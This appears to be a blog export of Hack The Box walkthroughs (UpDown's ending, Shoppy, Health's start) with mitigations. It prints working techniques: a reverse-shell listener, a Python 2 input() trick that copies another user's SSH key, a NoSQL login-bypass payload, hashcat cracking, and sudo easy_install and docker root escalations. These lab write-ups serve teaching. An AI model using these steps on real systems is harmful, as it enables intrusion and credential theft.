4444listening on [any] 4444 ...connect to [10.10.14.6] from (UNKNOWN) [10.10.11.177] 49620bash: cannot set terminal process group (910): Inappropriate ioctl for devicebash: no job control in this shellwww-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ Getting UserOnce I got in the machine, I looked for files with the suid bit set.www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ find / -perm /u=s 2&gt;/dev/null&lt;fc8e95da41b7b3fc5d0c$ find / -perm /u=s 2&gt;/dev/null                   /usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/bin/chsh/usr/bin/su/usr/bin/umount/usr/bin/sudo/usr/bin/gpasswd/usr/bin/fusermount/usr/bin/at/usr/bin/passwd/usr/bin/newgrp/usr/bin/chfn/usr/bin/mount/home/developer/dev/siteisupThere was an executable in developer‚Äôs home that I could run as them.www-data@updown:/home/developer$ ls -la /home/developer/dev/siteisup-rwsr-x--- 1 developer www-data 16928 Jun 22  2022 /home/developer/dev/siteisupwww-data@updown:/home/developer$ file /home/developer/dev/siteisup/home/developer/dev/siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not strippedwww-data@updown:/home/developer$ strings /home/developer/dev/siteisup/lib64/ld-linux-x86-64.so.2libc.so.6putssetresgidsetresuidsystemgetegidgeteuid...Welcome to 'siteisup.htb' application/usr/bin/python /home/developer/dev/siteisup_test.py:*3$\"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0...-rwxr-x--- 1 developer www-data 154 Jun 22  2022 /home/developer/dev/siteisup_test.pywww-data@updown:/home/developer$ cat /home/developer/dev/siteisup_test.pyimport requestsurl = input(\"Enter URL here:\")page = requests.get(url)if page.status_code == 200:        print \"Website is up\"else:        print \"Website is down\"www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ python --version&lt;/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ python --version                   Python 2.7.18The executable seemed to be using a python script to check if a site was up. The script was using input to get the URL to check. Python 2 has a known vulnerability in input. I used it to copy developer‚Äôs ssh key where I could read it.www-data@updown:/home/developer/dev$ ./siteisup                                                                      Welcome to 'siteisup.htb' application                                                                                                                                                                                                     Enter URL here:open('/tmp/key', 'w').write(open('/home/developer/.ssh/id_rsa').read())Traceback (most recent call last):                                                                                     File \"/home/developer/dev/siteisup_test.py\", line 4, in &lt;module&gt;        page = requests.get(url)                                                                                           File \"/usr/local/lib/python2.7/dist-packages/requests/api.py\", line 75, in get    return request('get', url, params=params, **kwargs)  File \"/usr/local/lib/python2.7/dist-packages/requests/api.py\", line 61, in request    return session.request(method=method, url=url, **kwargs)  File \"/usr/local/lib/python2.7/dist-packages/requests/sessions.py\", line 515, in request    prep = self.prepare_request(req)  File \"/usr/local/lib/python2.7/dist-packages/requests/sessions.py\", line 453, in prepare_request    hooks=merge_hooks(request.hooks, self.hooks),  File \"/usr/local/lib/python2.7/dist-packages/requests/models.py\", line 318, in prepare    self.prepare_url(url, params)  File \"/usr/local/lib/python2.7/dist-packages/requests/models.py\", line 392, in prepare_url    raise MissingSchema(error)requests.exceptions.MissingSchema: Invalid URL 'None': No scheme supplied. Perhaps you meant http://None?www-data@updown:/home/developer/dev$ ls /tmp/error-output.txt  keywww-data@updown:/home/developer/dev$ cat /tmp/key -----BEGIN OPENSSH PRIVATE KEY-----...-----END OPENSSH PRIVATE KEY-----www-data@updown:/home/developer/dev$ I copied the key to my machine and used it to reconnect to the server.$ vim dev_id_rsa$ chmod 600 dev_id_rsa$ ssh -i dev_id_rsa developer@targetWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat Jan  7 19:21:30 UTC 2023  System load:           0.0  Usage of /:            50.0% of 2.84GB  Memory usage:          14%  Swap usage:            0%  Processes:             221  Users logged in:       0  IPv4 address for eth0: 10.10.11.177  IPv6 address for eth0: dead:beef::250:56ff:feb9:241 * Super-optimized for small spaces - read how we shrank the memory   footprint of MicroK8s to make it the smallest full K8s around.   https://ubuntu.com/blog/microk8s-memory-optimisation8 updates can be applied immediately.8 of these updates are standard security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Tue Aug 30 11:24:44 2022 from 10.10.14.36developer@updown:~$ cat user.txtREDACTEDGetting rootEscalating to root was very easy. I checked if I could run anything with sudo.developer@updown:~$ sudo -lMatching Defaults entries for developer on localhost:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser developer may run the following commands on localhost:    (ALL) NOPASSWD: /usr/local/bin/easy_installdeveloper@updown:~$ ls -l /usr/local/bin/easy_install-rwxr-xr-x 1 root root 229 Aug  1 18:07 /usr/local/bin/easy_installdeveloper@updown:~$ file /usr/local/bin/easy_install/usr/local/bin/easy_install: Python script, ASCII text executabledeveloper@updown:~$ cat /usr/local/bin/easy_install#!/usr/bin/python# -*- coding: utf-8 -*-import reimport sysfrom setuptools.command.easy_install import mainif __name__ == '__main__':    sys.argv[0] = re.sub(r'(-script\\.pyw|\\.exe)?$', '', sys.argv[0])    sys.exit(main())I searched for exploits in easy_install and found one on GTFOBins that created a fake local package with code executed on installation.developer@updown:~$ TF=$(mktemp -d)developer@updown:~$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')\" &gt; $TF/setup.pydeveloper@updown:~$ sudo /usr/local/bin/easy_install $TFWARNING: The easy_install command is deprecated and will be removed in a future version.Processing tmp.YeeqjgELbWWriting /tmp/tmp.YeeqjgELbW/setup.cfgRunning setup.py -q bdist_egg --dist-dir /tmp/tmp.YeeqjgELbW/egg-dist-tmp-7F9vet# whoamiroot# cat /root/root.txtREDACTEDMitigationsI found the initial foothold on that box very hard. There were some security measures in place to make it harder to pwn. But it still had some issues that could be easily fixed.The .git folder should never be deployed with a site. Having access to the source code helped me find things I could exploit.The file upload functionality had a few issues.  The upload folder should not allow directory listing  Uploaded files should be renamed  The upload folder should have been outside the webroot  The list of extensions should have been an allowed list instead of a denied listThe disabled functions were great. This is what gave me a really hard time on that box. But it took only one missing function to allow access to the box. It shows that file upload is a very dangerous feature.The issue with the Python script can be fixed by using raw_input instead of input. And the executable should probably not have the suid bit set.As for easy_install, it is deprecated. So it should probably not be used. And it should not be run as root. Developers should install their dependencies as themselves."
  },
  
  {
    "title": "Hack The Box - Shoppy",
    "url": "/posts/HackTheBox-Walkthrough-Shoppy/",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Easy, Machine",
    "date": "2023-01-14 00:00:00 +0800",
    





    
    "snippet": "I had a hard time getting my initial access to this box. It required playing with Mongo Injection. And multiple enumerations of subdomains. Once on the box, getting root was quick. A reversing of a...",
    "content": "I had a hard time getting my initial access to this box. It required playing with Mongo Injection. And multiple enumerations of subdomains. Once on the box, getting root was quick. A reversing of a simple application and running Docker.  Room: Shoppy  Difficulty: Easy  URL: https://app.hackthebox.com/machines/Shoppy  Author: lockscanEnumerationAs always, I started the box by running rustscan to find open ports.$ rustscan -a target -- -v | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------üåçHACK THE PLANETüåç[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.129.46.180:22Open 10.129.46.180:80Open 10.129.46.180:9093[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p  \")[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 06:11 EDTInitiating Ping Scan at 06:11Scanning 10.129.46.180 [2 ports]Completed Ping Scan at 06:11, 0.03s elapsed (1 total hosts)Initiating Connect Scan at 06:11Scanning target (10.129.46.180) [3 ports]Discovered open port 80/tcp on 10.129.46.180Discovered open port 22/tcp on 10.129.46.180Discovered open port 9093/tcp on 10.129.46.180Completed Connect Scan at 06:11, 0.03s elapsed (3 total ports)Nmap scan report for target (10.129.46.180)Host is up, received syn-ack (0.028s latency).Scanned at 2022-09-19 06:11:10 EDT for 0sPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack80/tcp   open  http    syn-ack9093/tcp open  copycat syn-ackRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 0.11 secondsThere were 3 open ports:  22 (SSH)  80 (HTTP)  9093 (?)I checked what was on port 9093. I tried connecting to it with netcat, it had a web server on it.$ nc target 9093HTTP/1.1 400 Bad RequestContent-Type: text/plain; charset=utf-8Connection: close400 Bad Request%I opened it in a browser and got some kind of garbage collector logs.I also scanned for UDP ports. None were open.$ sudo nmap -sU target -oN nampUdp.txt[sudo] password for ehogue:Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 15:08 EDTNmap scan report for target (10.129.100.8)Host is up (0.045s latency).All 1000 scanned ports on target (10.129.100.8) are in ignored states.Not shown: 951 closed udp ports (port-unreach), 49 open|filtered udp ports (no-response)Nmap done: 1 IP address (1 host up) scanned in 997.63 secondsMain SiteI opened a browser to port 80 and I was redirected to http://shoppy.htb. I added that to my hosts files and reloaded the site.It was a simple page with a countdown for the launch of the site.I launched feroxbuster to scan for hidden pages.$ feroxbuster -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ü§ì                 ver: 2.7.1‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ  Target Url            ‚îÇ http://shoppy.htb üöÄ  Threads               ‚îÇ 50 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí•  Timeout (secs)        ‚îÇ 7 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.1 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml üíæ  Output File           ‚îÇ ferox.txt üèÅ  HTTP methods          ‚îÇ [GET] üîÉ  Recursion Depth       ‚îÇ 4‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ200      GET       26l       62w     1074c http://shoppy.htb/login302      GET        1l        4w       28c http://shoppy.htb/admin =&gt; /login200      GET       57l      129w     2178c http://shoppy.htb/301      GET       10l       16w      179c http://shoppy.htb/images =&gt; /images/301      GET       10l       16w      171c http://shoppy.htb/js =&gt; /js/301      GET       10l       16w      173c http://shoppy.htb/css =&gt; /css/301      GET       10l       16w      179c http://shoppy.htb/assets =&gt; /assets/302      GET        1l        4w       28c http://shoppy.htb/Admin =&gt; /login200      GET       26l       62w     1074c http://shoppy.htb/Login301      GET       10l       16w      187c http://shoppy.htb/assets/css =&gt; /assets/css/301      GET       10l       16w      185c http://shoppy.htb/assets/js =&gt; /assets/js/301      GET       10l       16w      187c http://shoppy.htb/assets/img =&gt; /assets/img/301      GET       10l       16w      177c http://shoppy.htb/fonts =&gt; /fonts/301      GET       10l       16w      191c http://shoppy.htb/assets/fonts =&gt; /assets/fonts/301      GET       10l       16w      203c http://shoppy.htb/assets/img/avatars =&gt; /assets/img/avatars/302      GET        1l        4w       28c http://shoppy.htb/ADMIN =&gt; /login301      GET       10l       16w      181c http://shoppy.htb/exports =&gt; /exports/301      GET       10l       16w      197c http://shoppy.htb/assets/img/dogs =&gt; /assets/img/dogs/200      GET       26l       62w     1074c http://shoppy.htb/LogIn200      GET       26l       62w     1074c http://shoppy.htb/LOGIN301      GET       10l       16w      199c http://shoppy.htb/assets/bootstrap =&gt; /assets/bootstrap/301      GET       10l       16w      207c http://shoppy.htb/assets/bootstrap/css =&gt; /assets/bootstrap/css/301      GET       10l       16w      205c http://shoppy.htb/assets/bootstrap/js =&gt; /assets/bootstrap/js/[####################] - 17m  1072496/1072496 0s      found:23      errors:13[####################] - 15m    63088/63088   68/s    http://shoppy.htb[####################] - 15m    63088/63088   68/s    http://shoppy.htb/[####################] - 15m    63088/63088   68/s    http://shoppy.htb/images[####################] - 15m    63088/63088   68/s    http://shoppy.htb/js[####################] - 15m    63088/63088   68/s    http://shoppy.htb/css[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/css[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/js[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/img[####################] - 15m    63088/63088   67/s    http://shoppy.htb/fonts[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/fonts[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/img/avatars[####################] - 16m    63088/63088   63/s    http://shoppy.htb/exports[####################] - 14m    63088/63088   72/s    http://shoppy.htb/assets/img/dogs[####################] - 10m    63088/63088   98/s    http://shoppy.htb/assets/bootstrap[####################] - 10m    63088/63088   98/s    http://shoppy.htb/assets/bootstrap/css[####################] - 10m    63088/63088   98/s    http://shoppy.htb/assets/bootstrap/jsThere was a login page on the site.I started experimenting with the login page. The form post was sending URL encoded data, but I found out I could send JSON.POST /login HTTP/1.1Host: shoppy.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 45Origin: http://shoppy.htbConnection: closeReferer: http://shoppy.htb/loginCookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BqJZWhUg9rHPJESKYav%2BTYIw0yPamDLm1FVV%2F6zyigcmcZZZcT6%2Bdh; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX18s3Kpqv13Qh3uXi%2F%2BTC1wmF%2F0fD6vRkOSDJkA4IUAGThTOALuvYKFBzL8Fvm2%2FipaMY0JC3slMDQ%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19o9wvZuqv6DsPRAhV9vRUXTM8HAo6pqjw%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX19fWE8xwhkhWoweKa%2FWuKV%2Bt8u9%2F%2FUFCfA%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19Ti1qyYZZAQa2C%2Bu5qCnwv%2BXwPN5vEpKY%3DUpgrade-Insecure-Requests: 1{\t\"username\":\"aaaa\",\t\"password\":\"aaa\"}HTTP/1.1 302 FoundServer: nginx/1.23.1Date: Sun, 09 Oct 2022 21:20:42 GMTContent-Type: text/html; charset=utf-8Content-Length: 102Connection: closeLocation: /login?error=WrongCredentialsVary: Accept&lt;p&gt;Found. Redirecting to &lt;a href=\"/login?error=WrongCredentials\"&gt;/login?error=WrongCredentials&lt;/a&gt;&lt;/p&gt;I tried SQL Injection and NoSQL Injection. The site seemed to crash when sending a single '. After trying lots of different payloads I found, I finally got one that worked.POST /login HTTP/1.1Host: shoppy.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 56Origin: http://shoppy.htbConnection: closeReferer: http://shoppy.htb/loginCookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BqJZWhUg9rHPJESKYav%2BTYIw0yPamDLm1FVV%2F6zyigcmcZZZcT6%2Bdh; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX18s3Kpqv13Qh3uXi%2F%2BTC1wmF%2F0fD6vRkOSDJkA4IUAGThTOALuvYKFBzL8Fvm2%2FipaMY0JC3slMDQ%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19o9wvZuqv6DsPRAhV9vRUXTM8HAo6pqjw%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX19fWE8xwhkhWoweKa%2FWuKV%2Bt8u9%2F%2FUFCfA%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19Ti1qyYZZAQa2C%2Bu5qCnwv%2BXwPN5vEpKY%3DUpgrade-Insecure-Requests: 1{\t\"username\":\"admin' || '1==1\",\t\"password\":\"aaa\"}HTTP/1.1 302 FoundServer: nginx/1.23.1Date: Sun, 09 Oct 2022 21:25:22 GMTContent-Type: text/html; charset=utf-8Content-Length: 56Connection: closeLocation: /adminVary: AcceptSet-Cookie: connect.sid=s%3AmNKTxh7ftyqhqdj5A07TAa2X-KIG_5wR.yESFg91bOC3floCU0ms6KxxVpL8BBmtVTEweVGbmr0w; Path=/; HttpOnly&lt;p&gt;Found. Redirecting to &lt;a href=\"/admin\"&gt;/admin&lt;/a&gt;&lt;/p&gt;I tried the same thing in my browser and I got the admin page.The site had a static product list. But it also allowed searching for users. I use the same injection than the login page. This gave me a button to download the results.I downloaded them, it gave me a JSON of the users.[  {    \"_id\": \"62db0e93d6d6a999a66ee67a\",    \"username\": \"admin\",    \"password\": \"23c6877d9e2b564ef8b32c3a23de27b2\"  },  {    \"_id\": \"62db0e93d6d6a999a66ee67b\",    \"username\": \"josh\",    \"password\": \"6ebcea65320589ca4f2f1ce039975995\"  }]The JSON contained two hashes, so I used hashcat to crack them.$ hashcat -a0 -m0 hash.txt /usr/share/seclists/rockyou.txthashcat (v6.2.5) startingOpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]============================================================================================================================================* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2873/5810 MB (1024 MB allocatable), 6MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 2 digests; 2 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 1 MBDictionary cache hit:* Filename..: /usr/share/seclists/rockyou.txt* Passwords.: 14344384* Bytes.....: 139921497* Keyspace..: 143443846ebcea65320589ca4f2f1ce039975995:REDACTEDApproaching final keyspace - workload adjusted.Session..........: hashcatStatus...........: ExhaustedHash.Mode........: 0 (MD5)Hash.Target......: hash.txtTime.Started.....: Sun Oct  9 16:06:34 2022 (3 secs)Time.Estimated...: Sun Oct  9 16:06:37 2022 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/seclists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:  4136.8 kH/s (0.20ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 1/2 (50.00%) DigestsProgress.........: 14344384/14344384 (100.00%)Rejected.........: 0/14344384 (0.00%)Restore.Point....: 14344384/14344384 (100.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: $HEX[21217365786d652121] -&gt; $HEX[042a0337c2a156616d6f732103]Hardware.Mon.#1..: Util: 51%Started: Sun Oct  9 16:06:32 2022Stopped: Sun Oct  9 16:06:39 2022It cracked the password for josh. I tried those credentials in SSH, but it failed.At this point, I got stuck for a long time. I had checked for subdomains already and did not find any. Eventually, I checked the Hack The Box forum for a hint. Someone mentioned using different lists. So I tried again with other lists. One of them found something.$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 11 -H \"Host:FUZZ.shoppy.htb\" \"http://shoppy.htb/\" /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://shoppy.htb/Total requests: 648201=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000328256:   200        0 L      141 W      3122 Ch     \"mattermost\"I added mattermost.shoppy.htb to my host file. And loaded the site. It gave me a login page.I tried josh‚Äôs credentials and I was in the chat application. I looked around the channels and found one that contained credentials.I used those credentials in SSH and I was in.$ ssh jaeger@targetjaeger@target's password:Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64The programs included with the Debian GNU/Linux system are free software;jaeger@shoppy:~$ lsDesktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videosjaeger@shoppy:~$ cat user.txtREDACTEDLateral MovementOnce I had a connection, I looked at what the user could do.jaeger@shoppy:~$ sudo -l[sudo] password for jaeger:Matching Defaults entries for jaeger on shoppy:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy:    (deploy) /home/deploy/password-managerI could execute a password manager as the user deploy.jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager[sudo] password for jaeger: Welcome to Josh password manager!     Please enter your master password: REDACTEDAccess denied! This incident will be reported !I ran the program, it required a password. I tried jaeger‚Äôs password but it did not work.I looked for strings in the binary.jaeger@shoppy:~$ strings /home/deploy/password-manager/lib64/ld-linux-x86-64.so.2__gmon_start___ITM_deregisterTMCloneTable                    ...Welcome to Josh password manager!Please enter your master password: Access granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !...I tried reading /home/deploy/creds.txt but I was not allowed.I used scp to get the executable locally and used Ghidra to reverse it. I quickly found the code that checked for the password.I used the password I found in the code and I was able to su as deploy.jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: REDACTEDAccess granted! Here is creds !Deploy Creds :username: deploypassword: REDACTEDjaeger@shoppy:~$ su deployPassword:$Getting rootOnce logged in as deploy, I looked for ways to get root. The user was not allowed to run anything with sudo and I did not find any suspicious suid binary.But the user was part of the docker group. So they could run docker.deploy@shoppy:/home/jaeger$ groupsdeploy dockerdeploy@shoppy:/home/jaeger$ docker imagesREPOSITORY   TAG       IMAGE ID       CREATED        SIZEalpine       latest    d7d3d98c851f   2 months ago   5.53MBI knew I could easily get root access with docker. I when to GTFOBins for the command to mount / in a container.deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh# ls /rootroot.txt# cat /root/root.txtREDACTEDMitigationThe first issue with this box was with the Mongo Injection. The code was using user input to build a string that it passed to $where.const query = { $where: `this.username === '${username}' &amp;&amp; this.password === '${passToTest}'` };It would have been safer to build the query without using $where. But this would still require that the data was validated to make sure only strings where used.const query = { username: `${username}`,  password: `${passToTest}` };Next, the way passwords are used on the box is bad. Josh‚Äôs password is reused between the main application and the chat server. Jaegear‚Äôs credentials are sent over chat. And deploy‚Äôs credentials are easy to get.Finally, permissions to run docker should be restricted. On this box, deploy was allowed to do it, and their credentials were easy to get. That made getting root very easy."
  },
  
  {
    "title": "Hack The Box - Health",
    "url": "/posts/HackTheBox-Walkthrough-Health/",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Medium, Machine",
    "date": "2023-01-07 00:00:00 +0800",
    





    
    "snippet": "This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.It started with using a web application t...",
    "content": "This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.It started with using a web application to reach an internal application and perform SQL Injection. Then I used the same application to read files on the server and become root.  Room: Health  Difficulty: Medium  URL: https://app.hackthebox.com/machines/Health  Author: irogirEnumerationI launch rustscan to look for opened ports on the server.$ rustscan -a target -- -A | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.129.134.205:22Open 10.129.134.205:80...PORT   STATE SERVICE REASON  VERSION22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChNRnKkpENG89qQHjD+2Kt9H7EDTMkQpzin70Rok0geRogbYVckxywChDv3yYhaDWQ9RrsOcWLs3uGzZR9nCfXOE3uTENbSWV5GdCd3wQNmWcSlkTD4dRcZshaAoMjs1bwzhK+cOy3ZU/ywbIXdHvAz3+Xvyz5yoEnboWYdWtBNFniZ7y/mZtA/XN19sCt5PcmeY40YFSuaVy/PUQnozplBVBIN6W5gnSE0Y+3J1MLBUkvf4+5zKvC+WLqA394Y1M+/UcVcPAjo6maik1JZNAmquWWo+y+28PdXSm9F2p2HAvwJjXc96f+Fl80+P4j1yxrhWC5AZM8fNCX8FjD7Jl7|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOR0vwVJwhe/5A7dkomT/li2XC2nvv6/4J6Oe8Xeyi/YQspx3RQGz3aG1sWTPstLu7yno0Z+Lk/GotRdyivSdLA=|   256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINgiR3y8U+HenhKVoN1EFipbmC6EjO3fWwWPUqa8EeJh80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods:|_  Supported Methods: GET HEAD OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: HTTP Monitoring Tool|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427EService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThere were 2 open ports:  22 - SSH  80 - HTTPWebhooksI launched a browser and looked at the website.The site allowed checking if another site was up. And sent the site content to a webhook.I started a web server on my machine and tried the application.$ 